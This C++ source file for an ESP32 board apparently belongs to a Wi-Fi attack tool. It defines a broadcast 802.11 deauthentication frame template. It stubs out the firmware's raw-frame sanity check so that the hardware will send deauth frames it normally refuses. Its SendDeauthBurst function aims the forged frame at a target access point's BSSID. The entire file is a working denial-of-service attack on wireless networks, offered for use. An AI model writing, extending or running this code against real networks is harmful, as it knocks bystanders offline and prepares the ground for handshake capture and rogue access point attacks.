#include "FrameInjector.hpp"
#include <cstring>
#include <array>
#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"

static const char* Tag = "FrameInjector";

static constexpr std::array<uint8_t, 26> DeauthTemplate = {{
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff, 0x02, 0x00
}};

extern "C" int ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t) { return 0; }

namespace FrameInjector {
    void SendRawFrame(const uint8_t* Buffer, int Size) {
        ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, Buffer, Size, false));
    }

    void SendDeauthBurst(const wifi_ap_record_t* Target) {
        std::array<uint8_t, 26> Frame = DeauthTemplate;
        memcpy(&Frame[10], Target->bssid, 6);
        memcpy(&Frame[16], Target->bssid, 6);
        SendRawFrame(Frame.data(), static_cast<int>(Frame.size()));
    }
}
